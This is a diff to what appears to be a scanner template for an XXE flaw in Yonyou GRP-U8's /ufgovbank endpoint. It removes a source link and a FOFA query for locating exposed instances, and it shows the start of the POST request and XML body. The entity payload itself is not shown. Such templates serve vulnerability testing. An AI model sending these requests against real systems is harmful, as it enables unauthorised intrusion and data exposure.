@@ -3,12 +3,8 @@ info:
   name: 用友GRP-U8 ufgovbank XXE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ecoq4ntzq0emkgua'
+  description: ''
   tags: xxe,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ecoq4ntzq0emkgua
-    fofa: app.name="用友GRP-U8 OA"
 http:
 - raw:
   - 'POST /ufgovbank HTTP/1.1
@@ -27,8 +23,6 @@ http:
 
 
     Accept-Encoding: gzip
-
-
 
 
     reqData=<?xml version="1.0"?>
